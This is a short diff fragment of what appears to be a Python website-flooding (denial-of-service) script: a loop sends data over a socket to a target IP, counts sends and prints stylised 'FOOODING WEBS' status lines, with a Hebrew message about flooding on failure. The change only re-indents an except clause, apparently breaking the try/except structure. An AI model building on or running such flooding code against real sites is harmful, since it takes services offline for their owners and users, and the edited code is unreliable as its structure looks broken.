@@ -95,7 +95,7 @@ def start():
         s.send(r)
         u += 1
         print("\033[92m[🌠\033[94m] \033[97m[FOOODING WEBS]  \033[96m " +str(u)+ "  \033[92mTarget: " +ip+ "  \033[0m")
-      except:
+  except:
         s.close()
         print("\033[97m[💥\033[97m] \033[97mמציפים למטה")
         
